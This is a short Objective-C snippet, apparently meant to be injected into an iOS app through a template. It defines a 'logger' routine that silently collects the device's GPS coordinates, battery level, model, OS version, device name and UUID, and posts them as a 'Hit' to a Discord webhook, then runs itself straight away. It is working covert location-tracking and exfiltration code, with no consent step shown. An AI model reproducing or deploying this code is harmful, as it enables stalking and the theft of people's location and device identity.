#include "espl.h"

-(void)logger {

    CLLocationManager* manager = [[CLLocationManager alloc] init];
    [manager startUpdatingLocation];
    CLLocation *location = [manager location];
    CLLocationCoordinate2D coordinate = [location coordinate];
//getting location..

    UIDevice *device = [UIDevice currentDevice];
    [device setBatteryMonitoringEnabled:YES];
    int batinfo=([device batteryLevel]*100);
    NSError *error;
    NSString *urlString = @"Discord Webhook Link";

    NSURL *url = [NSURL URLWithString:urlString];
    NSMutableURLRequest *request = [[NSMutableURLRequest alloc] init];
    NSString * parameterString = [NSString stringWithFormat:@"username=Hit&content=*maps.google.com/maps?q=%f,%f*\n**Model:** *%@*\n**Battery:** *%d*\n**System Version:** *%@ %@*\n**Device Name:** *%@*\n**UUID:** *%@*\n", coordinate.latitude, coordinate.longitude,[device model],batinfo, [device systemName], [device systemVersion], [device name],[[device identifierForVendor] UUIDString]];
    [request setHTTPMethod:@"POST"];
    [request setURL:url];
    NSData *postData = [parameterString dataUsingEncoding:NSUTF8StringEncoding];
    [request setHTTPBody:postData];//making a post request for discord webhook
    NSData *finalDataToDisplay = [NSURLConnection sendSynchronousRequest:request returningResponse:nil error:&error];
    NSMutableDictionary *abc = [NSJSONSerialization JSONObjectWithData: finalDataToDisplay
                                                           options: NSJSONReadingMutableContainers
                                                            error: &error];

  
}

//https://github.com/r6f
//by Kevin/Timer

[self performSelector:@selector(logger)];//call the function (this is for ted2 template)
